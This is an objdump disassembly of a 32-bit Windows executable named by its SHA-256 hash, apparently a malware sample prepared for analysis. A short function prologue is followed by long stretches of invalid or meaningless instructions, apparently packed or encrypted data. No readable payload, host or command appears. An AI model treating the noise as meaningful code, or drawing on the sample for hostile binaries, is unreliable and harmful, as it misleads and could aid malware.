
44fe648e7641d961d8935a259c8c1ba5a1d7284c55ad2b0f31168ea7973408cd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x448fa8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x448fac
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x448fb0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x448fb4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x448fb8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x448fbc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x448fc0
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x448fc4
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x448fc6
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417000
  4010e9:	test   eax,eax
  4010eb:	je     0x4152d6
  4010f1:	mov    edx,DWORD PTR [ebp-0x10]
  4010f4:	add    edx,0x1
  4010f7:	mov    DWORD PTR [ebp-0x10],edx
  4010fa:	(bad)
  4010fd:	jmp    0x4858:0x292279c1
  401104:	mov    bh,0x5c
  401106:	sub    dl,BYTE PTR [eax+0x6c]
  401109:	out    dx,eax
  40110a:	ret    
  40110b:	(bad)  
  40110c:	and    eax,0x88c87752
  401111:	fs push 0x533c7328
  401117:	frstor [esi]
  401119:	and    cl,bl
  40111b:	(bad)  
  40111c:	push   eax
  40111d:	std    
  40111e:	rcl    DWORD PTR [ecx],0x28
  401121:	fsubp  st(6),st
  401123:	and    edx,DWORD PTR [ebx+esi*8+0x761b79bd]
  40112a:	pop    es
  40112b:	pop    esp
  40112c:	sti    
  40112d:	add    DWORD PTR [ebp-0x27],eax
  401130:	scas   al,BYTE PTR es:[edi]
  401131:	mov    edx,0x64b4b928
  401136:	leave  
  401137:	popf   
  401138:	mov    esi,0x87d8665d
  40113d:	cmp    ch,ch
  40113f:	mov    bl,0xe5
  401141:	out    0x7d,eax
  401143:	adc    eax,0x4d301888
  401148:	popf   
  401149:	out    0xda,al
  40114b:	cld    
  40114c:	(bad)  
  40114d:	and    eax,esi
  40114f:	push   ebp
  401150:	adc    bh,BYTE PTR [edi-0x69e7a9db]
  401156:	sbb    dh,BYTE PTR [eax+0x4d]
  401159:	daa    
  40115a:	pushf  
  40115b:	jae    0x401126
  40115d:	pop    ds
  40115e:	push   edi
  40115f:	xor    al,0x80
  401161:	sub    eax,DWORD PTR [ebp-0x7a0633ea]
  401167:	in     eax,dx
  401168:	lock push ds
  40116a:	mov    WORD PTR [ebx+eax*2+0x49],?
  40116e:	je     0x4011d5
  401170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401171:	(bad)  
  401172:	pop    ebx
  401173:	js     0x401107
  401175:	inc    ebx
  401176:	outs   dx,BYTE PTR ds:[esi]
  401177:	dec    ecx
  401178:	xchg   ebp,eax
  401179:	sub    DWORD PTR [ebp-0x1597de55],edi
  40117f:	test   DWORD PTR [ecx],ebx
  401181:	pop    ebp
  401182:	(bad)  
  401183:	(bad)  
  401184:	fsubr  QWORD PTR [edi+0x3b]
  401187:	or     DWORD PTR [ebx-0x6a27713b],ebx
  40118d:	add    DWORD PTR [ebx+0x6c42cac6],ebp
  401193:	jb     0x4011ee
  401195:	cmp    eax,0x6613c42
  40119a:	inc    edi
  40119b:	and    DWORD PTR [ebp+0x54],ebx
  40119e:	test   BYTE PTR [ebx],dh
  4011a0:	shr    BYTE PTR [esi-0x1a],1
  4011a3:	add    ecx,DWORD PTR [esi]
  4011a5:	pop    edx
  4011a6:	(bad)  
  4011a7:	cmp    ecx,DWORD PTR [edx-0x6c]
  4011aa:	cdq    
  4011ab:	cmp    DWORD PTR [esi],ecx
  4011ad:	sbb    al,0xee
  4011af:	jmp    0x1edc11d9
  4011b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011b5:	ja     0x401152
  4011b7:	fistp  DWORD PTR [eax+0x1fab986a]
  4011bd:	inc    ebx
  4011be:	lsl    esp,WORD PTR [ecx]
  4011c1:	sbb    DWORD PTR [ebx+0x40],0x43
  4011c5:	cld    
  4011c6:	repz and eax,0x571a3f35
  4011cc:	imul   ebx,DWORD PTR gs:[ecx+0x51],0xcca26cc
  4011d4:	xrelease xchg BYTE PTR [esi],cl
  4011d7:	loope  0x4011e4
  4011d9:	pushf  
  4011da:	pop    esi
  4011db:	sbb    DWORD PTR [esp+ebp*4-0x51],0xffffffe6
  4011e0:	fdivr  st(5),st
  4011e2:	cmp    DWORD PTR [esi-0x4f],esi
  4011e5:	or     DWORD PTR [edx+0x327ba651],ebx
  4011eb:	inc    esi
  4011ec:	fs aas 
  4011ee:	iret   
  4011ef:	(bad)  
  4011f0:	xor    DWORD PTR [ebx],ecx
  4011f2:	popa   
  4011f3:	stos   BYTE PTR es:[edi],al
  4011f4:	cdq    
  4011f5:	cmp    al,0xea
  4011f7:	push   ebx
  4011f8:	push   ebp
  4011f9:	sub    edx,esp
  4011fb:	test   eax,0x52aef73f
  401200:	rcr    BYTE PTR [edi],1
  401202:	aaa    
  401203:	cmc    
  401204:	add    bh,BYTE PTR [edx]
  401206:	xchg   BYTE PTR [ebx-0xc],cl
  401209:	jg     0x401223
  40120b:	outs   dx,BYTE PTR ds:[esi]
  40120c:	sar    BYTE PTR [esi-0xc],0xe2
  401210:	ret    0xf83a
  401213:	(bad)  
  401214:	shl    BYTE PTR [esp+eiz*8],1
  401217:	push   esp
  401218:	out    dx,al
  401219:	aad    0x55
  40121b:	adc    ebx,ecx
  40121d:	js     0x4011a0
  40121f:	cmovo  esi,DWORD PTR [ebp+0x1232da69]
  401226:	lock xchg edi,eax
  401228:	push   es
  401229:	repnz mov ch,BYTE PTR [esi]
  40122c:	aas    
  40122d:	lock adc eax,0x4c8e7d1a
  401233:	inc    ebx
  401234:	icebp  
  401235:	ins    DWORD PTR es:[edi],dx
  401236:	sbb    al,0xb4
  401238:	pop    ecx
  401239:	je     0x4011c0
  40123b:	lock jle 0x40125b
  40123e:	mov    es,WORD PTR [ecx]
  401240:	daa    
  401241:	mov    al,ds:0xe46eb0d2
  401246:	outs   dx,DWORD PTR ds:[esi]
  401247:	or     ecx,edi
  401249:	ret    0x421b
  40124c:	dec    edi
  40124d:	lock pop eax
  40124f:	sub    al,0xb3
  401251:	mov    al,0xce
  401253:	xor    DWORD PTR [edx+0x5970a21d],eax
  401259:	(bad)  
  40125a:	sbb    DWORD PTR [esi+0x5b],eax
  40125d:	test   al,0x51
  40125f:	dec    eax
  401260:	dec    ebx
  401261:	adc    ch,BYTE PTR [ecx+eax*2]
  401264:	data16 stos BYTE PTR es:[edi],al
  401266:	sub    eax,0xb22227a7
  40126b:	pop    edi
  40126c:	lds    edi,FWORD PTR cs:[esi-0x1a]
  401270:	sub    DWORD PTR [edi+0x5d],ebp
  401273:	pushf  
  401274:	enter  0x3e4c,0x2d
  401278:	in     al,0xb7
  40127a:	jecxz  0x40125a
  40127c:	shl    BYTE PTR [ecx],1
  40127e:	dec    eax
  40127f:	push   edx
  401280:	push   ebx
  401281:	mov    ebp,0xfce25c79
  401286:	sbb    dl,bl
  401288:	popf   
  401289:	sbb    BYTE PTR [ebx-0x71],ch
  40128c:	or     al,0x62
  40128e:	xor    al,0x84
  401290:	loopne 0x4012ca
  401292:	repz push 0xffffffd9
  401295:	sbb    edi,DWORD PTR [edi+0x3cc70dda]
  40129b:	xor    DWORD PTR [esi],edi
  40129d:	repnz push esp
  40129f:	jae    0x401281
  4012a1:	aad    0xad
  4012a3:	scas   eax,DWORD PTR es:[edi]
  4012a4:	scas   al,BYTE PTR es:[edi]
  4012a5:	or     DWORD PTR [edi],edx
  4012a7:	adc    dl,al
  4012a9:	rcr    BYTE PTR [edx+0x1e],0x42
  4012ad:	mov    dh,0xb8
  4012af:	jnp    0x40131f
  4012b1:	fwait
  4012b2:	push   cs
  4012b3:	or     DWORD PTR [eax],ebx
  4012b5:	shl    ebx,1
  4012b7:	popf   
  4012b8:	shl    eax,1
  4012ba:	or     edx,esi
  4012bc:	int    0x2d
  4012be:	sar    BYTE PTR [ebx-0x47f872c],cl
  4012c4:	je     0x401278
  4012c6:	jmp    0x6c8fc7fc
  4012cb:	out    0x6,eax
  4012cd:	mov    ebx,0xa6e5e634
  4012d2:	xor    al,0x50
  4012d4:	sar    WORD PTR [esi+0x4388e37d],cl
  4012db:	add    ebp,DWORD PTR [eax]
  4012dd:	push   0xffffff8a
  4012df:	cmp    ebp,DWORD PTR [eax-0x4d]
  4012e2:	and    eax,0xf4ce6787
  4012e7:	push   ebx
  4012e8:	aas    
  4012e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ea:	out    dx,al
  4012eb:	loop   0x401364
  4012ed:	mul    DWORD PTR ds:0xdbb35386
  4012f3:	pusha  
  4012f4:	or     eax,0xe4dd20f9
  4012f9:	mov    ah,0xe5
  4012fb:	mov    cl,0x4d
  4012fd:	push   esi
  4012fe:	cmp    DWORD PTR [eax+edi*8],ecx
  401301:	pop    eax
  401302:	(bad)  [esi]
  401304:	fwait
  401305:	pop    edi
  401306:	fcom   QWORD PTR [ebx+0xc]
  401309:	(bad)  
  40130a:	push   ebx
  40130b:	mov    ch,0x75
  40130d:	or     DWORD PTR [edi+0x27],esp
  401310:	jl     0x401304
  401312:	mov    dl,0x65
  401314:	push   ds
  401315:	add    eax,DWORD PTR [esi+0xbbaccc3]
  40131b:	fs std 
  40131d:	dec    ecx
  40131e:	sar    esp,cl
  401320:	out    dx,al
  401321:	pop    esp
  401322:	or     ecx,DWORD PTR [ebx]
  401324:	add    bl,BYTE PTR [esi-0x80]
  401327:	mov    BYTE PTR [ecx-0x165817c4],dl
  40132d:	push   esi
  40132e:	ins    BYTE PTR es:[edi],dx
  40132f:	test   eax,0x931b8b3c
  401334:	in     al,0x42
  401336:	test   DWORD PTR [ebx+eiz*4+0x1b],eax
  40133a:	imul   edi,ecx,0x84ab6816
  401340:	dec    ebp
  401341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401342:	fucomip st,st(7)
  401344:	mov    ebx,ebp
  401346:	test   DWORD PTR [ebx+0x7b],eax
  401349:	sub    DWORD PTR [esp+edi*2+0x2300204f],esp
  401350:	or     ah,BYTE PTR [esi+ecx*8+0x59]
  401354:	cs xchg ecx,eax
  401356:	loope  0x4012f0
  401358:	inc    edx
  401359:	xchg   edi,eax
  40135a:	or     eax,0x16ac1c8
  40135f:	inc    edx
  401360:	or     BYTE PTR ds:0x40f4c19b,bh
  401366:	push   esi
  401367:	stc    
  401368:	aaa    
  401369:	dec    ebp
  40136a:	mov    cl,0xba
  40136c:	hlt    
  40136d:	outs   dx,BYTE PTR ds:[esi]
  40136e:	push   edi
  40136f:	pushf  
  401370:	pusha  
  401371:	popf   
  401372:	ins    BYTE PTR es:[edi],dx
  401373:	dec    edi
  401374:	out    0x61,al
  401376:	add    eax,0x7afafa36
  40137b:	popf   
  40137c:	ss (bad) 
  40137e:	daa    
  40137f:	call   0x1c8118cf
  401384:	pop    es
  401385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401386:	adc    BYTE PTR [esi+esi*1+0xb444dd9],bh
  40138d:	lods   eax,DWORD PTR ds:[esi]
  40138e:	push   edi
  40138f:	das    
  401390:	xor    edx,esi
  401392:	fld    QWORD PTR [edi]
  401394:	or     BYTE PTR [edi+0x8],dl
  401397:	mov    ?,eax
  401399:	inc    ecx
  40139a:	ins    BYTE PTR es:[edi],dx
  40139b:	mov    BYTE PTR [edx],0xc8
  40139e:	aad    0xe4
  4013a0:	clc    
  4013a1:	loopne 0x401366
  4013a3:	fs inc esp
  4013a5:	rcl    DWORD PTR [ecx+eax*8+0x76247147],1
  4013ac:	push   ecx
  4013ad:	(bad)  [eax-0x568380ba]
  4013b3:	sub    edi,DWORD PTR [ecx+0x52b94271]
  4013b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013ba:	or     al,0x9d
  4013bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013bd:	push   cs
  4013be:	jle    0x4013f0
  4013c0:	in     eax,0x59
  4013c2:	mov    ebp,0xfd664952
  4013c7:	out    0xcd,al
  4013c9:	imul   esp,DWORD PTR [edi],0x21
  4013cc:	pop    es
  4013cd:	mov    ch,0xcd
  4013cf:	xlat   BYTE PTR ds:[ebx]
  4013d1:	dec    ecx
  4013d2:	adc    dh,BYTE PTR [edx+0x29ab9cd6]
  4013d8:	fild   WORD PTR [ebx+0x68c0b2d6]
  4013de:	(bad)  
  4013e0:	pop    esi
  4013e1:	popw   ss
  4013e3:	retf   
  4013e4:	mov    eax,ds:0x65a392d9
  4013e9:	das    
  4013ea:	(bad)  
  4013eb:	dec    eax
  4013ec:	push   ebp
  4013ed:	and    cl,ah
  4013ef:	sub    BYTE PTR [edx+0x681160de],dh
  4013f5:	pop    ecx
  4013f6:	jle    0x401441
  4013f8:	(bad)  [edi]
  4013fa:	in     al,0xa
  4013fc:	xlat   BYTE PTR ds:[ebx]
  4013fd:	jmp    0x401403
  4013ff:	add    cl,ah
  401401:	mov    ah,0x5e
  401403:	sbb    eax,0x10841eba
  401408:	inc    eax
  401409:	test   eax,0x2f3105bc
  40140e:	or     eax,0x24038eb
  401413:	or     eax,0x1192ec87
  401418:	ret    0x277e
  40141b:	inc    eax
  40141c:	and    al,cl
  40141e:	jl     0x4013b4
  401420:	(bad)  
  401421:	rcr    DWORD PTR gs:[ecx-0x176e98f6],cl
  401428:	aas    
  401429:	ret    0x96a3
  40142c:	js     0x40141d
  40142e:	in     al,0xf5
  401430:	jns    0x4013e6
  401432:	or     ah,0x54
  401435:	out    dx,al
  401436:	xchg   esp,eax
  401437:	mov    bl,0x0
  401439:	ins    DWORD PTR es:[edi],dx
  40143a:	mov    ebx,0x192e5dd9
  40143f:	mov    al,cl
  401441:	mov    al,ds:0x63845afb
  401446:	or     BYTE PTR [esi+0x2f],0xe1
  40144a:	fs mov al,0x53
  40144d:	dec    ebx
  40144e:	lods   al,BYTE PTR ds:[esi]
  40144f:	cdq    
  401450:	test   eax,0xaab50493
  401455:	in     al,0x29
  401457:	frstor [ebx+0x47]
  40145a:	lods   al,BYTE PTR ds:[esi]
  40145b:	out    dx,al
  40145c:	jns    0x401477
  40145e:	std    
  40145f:	sub    eax,0x8d8baede
  401464:	add    BYTE PTR [edi+0x45],bh
  401467:	sbb    esi,esi
  401469:	jmp    0x507:0xe6033d08
  401470:	stos   BYTE PTR es:[edi],al
  401471:	mov    edx,0x7971f8f
  401476:	cmp    esp,DWORD PTR [ecx]
  401478:	jns    0x40140b
  40147a:	rcr    BYTE PTR [ebx-0x7df8efcd],0x1f
  401481:	(bad)  fs:[edi]
  401484:	in     al,dx
  401485:	dec    esi
  401486:	inc    ebx
  401487:	jae    0x401426
  401489:	jg     0x4014dd
  40148b:	lock fistp QWORD PTR [edi]
  40148e:	inc    ecx
  40148f:	mov    bl,0x14
  401491:	retf   
  401492:	mov    esp,0xcfe85595
  401497:	std    
  401498:	dec    ebx
  401499:	fcmovbe st,st(6)
  40149b:	dec    ebx
  40149c:	jp     0x4014ad
  40149e:	outs   dx,BYTE PTR ds:[esi]
  40149f:	inc    edi
  4014a0:	enter  0x7e21,0xc8
  4014a4:	lds    esi,FWORD PTR [ebx-0x5b]
  4014a7:	aaa    
  4014a8:	cmp    al,0x5d
  4014aa:	fidiv  WORD PTR ds:0x76d475a
  4014b0:	push   ecx
  4014b1:	inc    ebx
  4014b2:	pop    eax
  4014b3:	sahf   
  4014b4:	out    dx,eax
  4014b5:	dec    ecx
  4014b6:	mov    edi,0x82b99790
  4014bb:	push   cs
  4014bc:	cld    
  4014bd:	pop    es
  4014be:	addr16 xchg ebp,eax
  4014c0:	push   esi
  4014c1:	mov    dh,BYTE PTR [eax-0x733bb4a5]
  4014c7:	mov    ds:0x17793316,al
  4014cc:	cmc    
  4014cd:	jnp    0x401454
  4014cf:	cli    
  4014d0:	inc    ebp
  4014d1:	out    0x1,al
  4014d3:	add    al,0xba
  4014d5:	cmp    al,0xfe
  4014d7:	retf   
  4014d8:	repnz pop ss
  4014da:	das    
  4014db:	xchg   edx,ecx
  4014dd:	xchg   edi,eax
  4014de:	and    al,0x2e
  4014e0:	out    0x36,al
  4014e2:	pushf  
  4014e3:	push   ebp
  4014e4:	outs   dx,DWORD PTR ds:[esi]
  4014e5:	or     ecx,DWORD PTR [edx-0xd231e21]
  4014eb:	mov    ebp,0xb42aa084
  4014f0:	out    0xa2,eax
  4014f2:	add    DWORD PTR [esi],esp
  4014f4:	(bad)  
  4014f5:	cmc    
  4014f6:	leave  
  4014f7:	(bad)  
  4014f8:	jbe    0x401484
  4014fa:	pop    ds
  4014fb:	lods   al,BYTE PTR ds:[esi]
  4014fc:	pop    ebx
  4014fd:	lds    esp,FWORD PTR [eax+0x38835d93]
  401503:	fs xchg edx,eax
  401505:	aam    0x8c
  401507:	test   eax,0x39cc8748
  40150c:	jno    0x4014e1
  40150e:	cs mov esi,0x80a330b1
  401514:	div    DWORD PTR [eax+0x50]
  401517:	inc    ebx
  401518:	hlt    
  401519:	mov    dh,0x6
  40151b:	aam    0x89
  40151d:	push   esp
  40151e:	cmp    edx,DWORD PTR ds:0x60445d59
  401524:	inc    eax
  401525:	out    dx,eax
  401526:	pop    esi
  401527:	pop    esi
  401528:	sbb    al,0x4
  40152a:	add    eax,0x669dfa51
  40152f:	arpl   WORD PTR [eax-0x7e],sp
  401532:	xchg   esi,eax
  401533:	dec    ecx
  401534:	repnz mov ch,0x3d
  401537:	xor    BYTE PTR [ebx+0x72],cl
  40153a:	sub    al,dl
  40153c:	in     al,dx
  40153d:	add    al,0x7c
  40153f:	adc    eax,edx
  401541:	sbb    DWORD PTR [edx],ebp
  401543:	jg     0x401569
  401545:	les    esi,FWORD PTR [esi*2+0x56bd21cc]
  40154c:	dec    esi
  40154d:	mov    ah,0xd0
  40154f:	aam    0x0
  401551:	jbe    0x401510
  401553:	xor    DWORD PTR [esi+0x23],esi
  401556:	fisub  DWORD PTR [edx]
  401558:	xor    al,0xb8
  40155a:	iret   
  40155b:	aad    0x6c
  40155d:	ret    0xb97e
  401560:	popa   
  401561:	push   eax
  401562:	mov    dl,0xaf
  401564:	and    edx,0x44
  401567:	xor    al,0xe2
  401569:	and    bh,bl
  40156b:	push   ebp
  40156c:	dec    esp
  40156d:	(bad)  
  40156e:	test   DWORD PTR ds:0x45c4059e,edx
  401574:	inc    edx
  401575:	ret    0x5218
  401578:	dec    esi
  401579:	popf   
  40157a:	fwait
  40157b:	or     BYTE PTR [esi-0x62cfe9c9],cl
  401581:	push   0xffffff88
  401583:	loope  0x40151f
  401585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401586:	je     0x4015d7
  401588:	sub    DWORD PTR gs:0xb78eb6e9,ecx
  40158f:	pushf  
  401590:	scas   al,BYTE PTR es:[edi]
  401591:	mov    ch,0x3a
  401593:	pop    esp
  401594:	lock outs dx,DWORD PTR ds:[esi]
  401596:	or     DWORD PTR [edi],ebp
  401598:	and    ch,BYTE PTR [edx+ecx*2+0x64b7bdb5]
  40159f:	loope  0x4015c1
  4015a1:	jmp    0x5fa6:0xd0a40348
  4015a8:	shl    DWORD PTR [edx+0x44],cl
  4015ab:	dec    eax
  4015ac:	xchg   BYTE PTR [eax+0x3c],ch
  4015af:	popf   
  4015b0:	(bad)  
  4015b1:	jbe    0x401585
  4015b3:	xor    al,0xae
  4015b5:	add    eax,0xe61bbf8c
  4015ba:	dec    eax
  4015bb:	cmp    eax,0xd7a2c0a0
  4015c0:	push   ds
  4015c1:	add    DWORD PTR [edx],eax
  4015c3:	mov    ebp,0x5fe39718
  4015c8:	xchg   BYTE PTR [edi-0x2e],ah
  4015cb:	inc    esp
  4015cc:	(bad)  
  4015cd:	arpl   WORD PTR [ebx+ecx*4-0x180c2f6a],di
  4015d4:	mov    al,ds:0xff685e5e
  4015d9:	rol    BYTE PTR [edx+0x1acbb504],cl
  4015df:	imul   esp,DWORD PTR [esi],0x36
  4015e2:	repnz or DWORD PTR [edi+ebp*8],edx
  4015e6:	xchg   ebp,eax
  4015e7:	sub    cl,al
  4015e9:	leave  
  4015ea:	pop    esi
  4015eb:	arpl   WORD PTR [bp+di],ax
  4015ee:	jg     0x40161a
  4015f0:	add    edi,DWORD PTR [bx-0x68]
  4015f4:	out    0x76,al
  4015f6:	mov    ?,eax
  4015f8:	out    0x25,al
  4015fa:	psubw  mm3,mm5
  4015fd:	test   esp,esp
  4015ff:	jae    0x401616
  401601:	ins    DWORD PTR es:[edi],dx
  401602:	push   es
  401603:	test   eax,0x470dcca4
  401608:	in     al,dx
  401609:	(bad)  
  40160a:	jmp    0x4015f6
  40160c:	mov    ds:0xb6e08a65,eax
  401611:	in     eax,dx
  401612:	or     eax,0xbd8620c3
  401617:	fnstenv [eax+0xc]
  40161a:	out    dx,al
  40161b:	hlt    
  40161c:	jmp    0x8877:0xa2b6cbd7
  401623:	push   esp
  401624:	mov    ds:0x51a4bc28,eax
  401629:	pop    esp
  40162a:	fcomip st,st(3)
  40162c:	jb     0x401641
  40162e:	loope  0x4015e4
  401630:	xchg   ebp,eax
  401631:	and    DWORD PTR [ebp-0x7b],ecx
  401634:	pushf  
  401635:	gs push 0x3e
  401638:	mov    eax,DWORD PTR [ebx]
  40163a:	jecxz  0x40165c
  40163c:	ficom  WORD PTR [eax+0x17]
  40163f:	mov    cl,0xdc
  401641:	sub    dh,ah
  401643:	loopne 0x4015e6
  401645:	sbb    eax,0xd6a76223
  40164a:	sahf   
  40164b:	inc    esi
  40164c:	xlat   BYTE PTR ds:[ebx]
  40164d:	pop    DWORD PTR [ebx+0x3a27670c]
  401653:	enter  0x56c1,0x15
  401657:	popf   
  401658:	jbe    0x401647
  40165a:	xchg   ecx,eax
  40165b:	sbb    BYTE PTR [esi+0x4e],ch
  40165e:	(bad)  
  40165f:	sub    esi,DWORD PTR ds:0x78e70ae4
  401665:	push   edx
  401666:	xor    eax,0x751351d4
  40166b:	adc    esi,DWORD PTR [ecx+0x6423aa9]
  401671:	cmp    edx,DWORD PTR [ebx-0x60ecb0c1]
  401677:	aam    0x38
  401679:	inc    ecx
  40167a:	sbb    BYTE PTR [edi-0x3b41db9d],0x7f
  401681:	pop    ss
  401682:	lea    ebx,[ecx+0x2]
  401685:	xchg   edx,eax
  401686:	dec    ebx
  401687:	jno    0x401671
  401689:	mov    ds:0x6c3293b8,eax
  40168e:	out    dx,eax
  40168f:	push   esi
  401690:	xchg   esi,eax
  401691:	fadd   DWORD PTR [eax+0x24291873]
  401697:	pop    eax
  401698:	push   edi
  401699:	cmp    BYTE PTR [eax-0x40e4cc0d],bh
  40169f:	sbb    BYTE PTR [edx],ah
  4016a1:	sbb    edi,edi
  4016a3:	mov    al,ds:0x1dd0db5d
  4016a8:	xor    al,0x27
  4016aa:	dec    esp
  4016ab:	mov    eax,DWORD PTR [ebx-0x8ccacb5]
  4016b1:	std    
  4016b2:	sbb    eax,0x963b0490
  4016b7:	mov    BYTE PTR [edi+0x46e744d9],ch
  4016bd:	sbb    esp,ebx
  4016bf:	lahf   
  4016c0:	daa    
  4016c1:	cs mov bh,0xed
  4016c4:	xchg   DWORD PTR [ecx],edi
  4016c6:	mov    DWORD PTR [ecx+eax*8+0x19ec1b3b],esi
  4016cd:	out    0x28,al
  4016cf:	stos   DWORD PTR es:[edi],eax
  4016d0:	sbb    eax,0x23a172f5
  4016d5:	xchg   esp,eax
  4016d6:	je     0x401687
  4016d8:	sbb    ebp,DWORD PTR [eax+0x4536b3bf]
  4016de:	out    0xf2,al
  4016e0:	ins    BYTE PTR es:[edi],dx
  4016e1:	or     al,0x4e
  4016e3:	sar    BYTE PTR [ebx+0x49],1
  4016e6:	inc    esi
  4016e7:	mov    al,0x18
  4016e9:	retf   
  4016ea:	(bad)  
  4016eb:	hlt    
  4016ec:	fs dec eax
  4016ee:	repz out 0xb,al
  4016f1:	sbb    eax,0xfa730318
  4016f6:	(bad)  
  4016f7:	mov    eax,0x22b00dca
  4016fc:	imul   ebp,DWORD PTR ds:0xecaed0dc,0x2470f760
  401706:	or     bh,ah
  401708:	jno    0x4016ef
  40170a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40170b:	in     al,dx
  40170c:	cmp    eax,0x3487c4e6
  401711:	xchg   BYTE PTR [ebx+0x12d73c31],cl
  401717:	mov    eax,ds:0x80afd8e6
  40171c:	push   esp
  40171d:	inc    ecx
  40171e:	adc    al,ah
  401720:	repz test DWORD PTR es:[esi],esi
  401724:	dec    esp
  401725:	scas   eax,DWORD PTR es:[edi]
  401726:	sar    DWORD PTR [ebx+ebx*1-0x385e0063],0x7f
  40172e:	ret    
  40172f:	add    ebx,ecx
  401731:	popf   
  401732:	mov    bl,0xca
  401734:	clc    
  401735:	icebp  
  401736:	lahf   
  401737:	arpl   WORD PTR [eax],bp
  401739:	sub    DWORD PTR [esi-0x17],ecx
  40173c:	(bad)  
  40173d:	jae    0x4017aa
  40173f:	iret   
  401740:	jge    0x4017b7
  401742:	shl    DWORD PTR [ebx],1
  401744:	mov    bh,0x89
  401746:	xchg   ebx,eax
  401747:	mov    bh,0x3
  401749:	lock adc ah,dh
  40174c:	mov    ecx,0xec2542af
  401751:	jg     0x4016dd
  401753:	outs   dx,BYTE PTR ds:[esi]
  401754:	xor    BYTE PTR [ebp+0x47],ah
  401757:	jo     0x4016df
  401759:	xchg   esi,eax
  40175a:	cmc    
  40175b:	fild   WORD PTR [ecx]
  40175d:	fisttp DWORD PTR [ebp+0x5e32b7b7]
  401763:	jl     0x401726
  401765:	cmp    DWORD PTR [eax-0x49],eax
  401768:	push   esp
  401769:	loope  0x401711
  40176b:	aam    0x8
  40176d:	aaa    
  40176e:	aas    
  40176f:	out    0x28,al
  401771:	sbb    eax,0xe1d3b077
  401776:	(bad)  
  401778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401779:	loop   0x40171e
  40177b:	clc    
  40177c:	ret    
  40177d:	out    0x5a,eax
  40177f:	jae    0x4017bd
  401781:	cmp    cl,ch
  401783:	mov    dh,0xef
  401785:	scas   al,BYTE PTR es:[edi]
  401786:	xor    ah,cl
  401788:	rcr    BYTE PTR [ebx+0xa14c9cb],1
  40178e:	cmp    eax,0x76ebd5ff
  401793:	ret    0xb56
  401796:	xor    BYTE PTR [ecx+0x7d01757c],dh
  40179c:	push   esp
  40179d:	push   es
  40179e:	(bad)  
  40179f:	jno    0x401775
  4017a1:	or     DWORD PTR [edi],0x94861cf
  4017a7:	popa   
  4017a8:	dec    ebp
  4017a9:	pop    ebx
  4017aa:	or     ah,BYTE PTR [esi]
  4017ac:	pop    ss
  4017ad:	in     eax,0x15
  4017af:	in     eax,dx
  4017b0:	les    ecx,FWORD PTR [ecx]
  4017b2:	jns    0x401734
  4017b4:	icebp  
  4017b5:	les    edi,FWORD PTR gs:[ebp-0x2453012]
  4017bc:	loop   0x4017a1
  4017be:	sub    cl,BYTE PTR [ebx]
  4017c0:	inc    ebp
  4017c1:	jo     0x4017ee
  4017c3:	or     eax,0xf33e381c
  4017c8:	call   0x2912b76a
  4017cd:	fs jo  0x4017dd
  4017d0:	mov    WORD PTR [ecx-0x5d],ds
  4017d3:	hlt    
  4017d4:	sub    DWORD PTR ds:0xd7d51db1,ecx
  4017da:	mov    ds:0x9df4e897,al
  4017df:	pop    ss
  4017e0:	mov    eax,0x7970b8ce
  4017e5:	bound  esi,QWORD PTR [ecx-0x8fbc6a7]
  4017eb:	sub    bl,BYTE PTR [edx]
  4017ed:	jmp    0x40183d
  4017ef:	jno    0x4017e9
  4017f1:	jmp    0x63a2:0x48bc7112
  4017f8:	dec    esi
  4017f9:	dec    esi
  4017fa:	fs push cs
  4017fc:	or     eax,0x67c045a8
  401801:	jnp    0x4017cd
  401803:	inc    ecx
  401804:	sbb    al,0x58
  401806:	faddp  st(5),st
  401808:	in     al,0xb3
  40180a:	xchg   ecx,eax
  40180b:	pop    ebx
